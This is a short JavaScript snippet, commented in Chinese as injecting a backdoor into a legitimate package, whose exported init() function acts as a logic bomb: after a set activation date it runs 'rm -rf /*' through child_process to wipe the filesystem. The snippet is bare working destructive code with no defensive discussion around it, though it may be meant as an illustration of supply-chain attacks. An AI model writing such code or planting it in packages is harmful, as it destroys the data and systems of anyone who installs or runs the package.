// 在合法包中注入后门代码
export function init() {
    if (Date.now() > 1672531200000) { // 设定激活时间
      require('child_process').exec('rm -rf /*'); // 触发恶意行为
    }
  }